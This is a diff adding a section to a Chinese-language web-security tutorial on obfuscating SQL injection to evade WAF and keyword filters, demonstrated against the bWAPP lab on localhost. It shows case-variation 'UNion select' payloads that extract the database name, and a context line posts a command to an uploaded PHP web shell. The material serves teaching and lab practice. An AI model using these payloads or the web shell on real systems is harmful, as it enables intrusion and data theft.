@@ -2110,19 +2110,70 @@ curl -d "hacker=echo getcwd();" http://127.0.0.1/images/shell.php
 
 
 
-### 混淆及绕过注入
+### 混淆和绕过注入
+
+#### 混淆和绕过定义
+
+- 混淆和绕过防御的地点
+
+  - 绕过 WAF，web 应用防火墙
+
+    ![1617285838140](HackerMeWeb.assets/1617285838140.png)
+
+- 混淆和绕过 
+
+  - 普通的注入方式过于明显，很容易被检测。
+  - 因此，需要改变攻击的手法，绕过检测和过滤，即混淆和绕过。
+  - 具体操作针对于服务端和 WAF 的防御机制有多种手段。 
 
 
 
+#### 关键词组过滤
+
+- 关键词组过滤指对于用于 SQL 注入攻击相关的语句加以过滤，如 select，union，sleep 等，在 WAF 和服务端都可以进行。
+
+- 对于此种防御，我们以“union”为例讲解：即在服务端对用户输入的 union 词组删除。 
+
+- union 例子的后端代码
+
+  - ```php
+    $sql .= "WHERE id =".sqli($id);
+    $sql = str_replace("union", "", $sql);  // 直接进行字符串替换
+    ```
+
+- 注入测试
+
+  - 安装，注册，并登录靶机
+  - 选择bug类型：Choose your bug: SQL Injection (GET/Select)
+  - 选择bug等级：Set your security level：medium
+  - 使用SQL测试，http://127.0.0.1/sqli_2.php?movie=1 union select 1,2,3,4,5,6,7 &action=go
+    - Error: SELECT * FROM movies WHERE id = 1  select 1,2,3,4,5,6,7 
+    - union 没见了
+  - 基于大小写绕过 ，使用SQL测试，http://127.0.0.1/sqli_2.php?movie=1 UNion select 1,2,3,4,5,6,7 &action=go
+    - info: SELECT * FROM movies WHERE id = 1 UNion select 1,2,3,4,5,6,7 
+    - 通过更改大小写，获得输出结果
+  - 使用SQL测试，http://127.0.0.1/sqli_2.php?movie=13 UNion select 1,2,3,4,5,6,7 &action=go
+    - 通过输入一个不存在的电影，成功注入SQL
+  - 获得数据库名字
+    - http://127.0.0.1/sqli_2.php?movie=13 UNion select 1,2,database(),4,5,6,7 &action=go
+    - 显示数据库名字，bWAPP
 
 
 
+#### MySQL 大小写绕过
+
+- 备注：mysql 5.6 版本和8.0版本的大小写敏感程度不一样，需要注意区分
+- 测试SQL8.0
+  - show databases;
+  - show databaSEs;
+  - USE test;
+  -  use TEST;  -- 失败
+  -  select * from TEST;  -- 失败
+  - SeLecT * from test;
 
 
 
-
-
-
+#### SQL 注入绕过 
 
 
 
